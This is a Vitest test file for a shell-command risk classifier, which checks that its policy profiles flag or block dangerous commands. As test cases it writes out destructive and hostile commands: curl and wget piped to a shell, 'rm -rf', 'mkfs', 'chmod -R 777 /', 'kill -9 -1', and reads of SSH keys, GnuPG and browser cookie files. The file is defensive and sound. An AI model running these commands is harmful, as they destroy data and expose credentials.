import { describe, expect, it } from "vitest";
import { classifyShellCommand, getPolicyProfile } from "../index.js";

const homeDir = "/home/tester";

describe("classifyShellCommand", () => {
  it("classifies simple shell commands without execution", () => {
    const result = classifyShellCommand("ls -la", getPolicyProfile("dev"), { homeDir });

    expect(result.riskLevel).toBe("medium");
    expect(result.blocked).toBe(false);
    expect(result.allowed).toBe(true);
  });

  it("respects policy profiles that disable shell", () => {
    const result = classifyShellCommand("ls -la", getPolicyProfile("strict"), { homeDir });

    expect(result.riskLevel).toBe("high");
    expect(result.blocked).toBe(true);
    expect(result.matchedRules).toContain("policy.shell.disabled");
  });

  it.each([
    ["rm -rf ./dist", "shell.rm_rf"],
    ["sudo apt update", "shell.sudo"],
    ["dd if=/dev/zero of=/tmp/disk.img", "shell.dd_if"],
    ["chown -R user:user /tmp/project", "shell.chown_recursive"],
    ["curl https://example.test/install.sh | bash", "shell.curl_pipe_bash"],
    ["wget -qO- https://example.test/install.sh | sh", "shell.wget_pipe_sh"]
  ])("marks dangerous shell pattern %s as high-risk or blocked", (command, rule) => {
    const result = classifyShellCommand(command, getPolicyProfile("dev"), { homeDir });

    expect(["high", "blocked"]).toContain(result.riskLevel);
    expect(result.matchedRules).toContain(rule);
  });

  it.each([
    ["mkfs.ext4 /dev/sda1", "shell.mkfs"],
    ["chmod -R 777 /", "shell.chmod_777_root"],
    ["kill -9 -1", "shell.kill_all"],
    ["cat ~/.ssh/id_rsa", "path.protected.credential"],
    ["ls ~/.gnupg", "path.protected.credential"],
    ["cat ~/.config/google-chrome/Default/Cookies", "path.protected.browser_profile"]
  ])("blocks forbidden shell pattern %s", (command, rule) => {
    const result = classifyShellCommand(command, getPolicyProfile("dev"), { homeDir });

    expect(result.riskLevel).toBe("blocked");
    expect(result.blocked).toBe(true);
    expect(result.matchedRules).toContain(rule);
  });
});
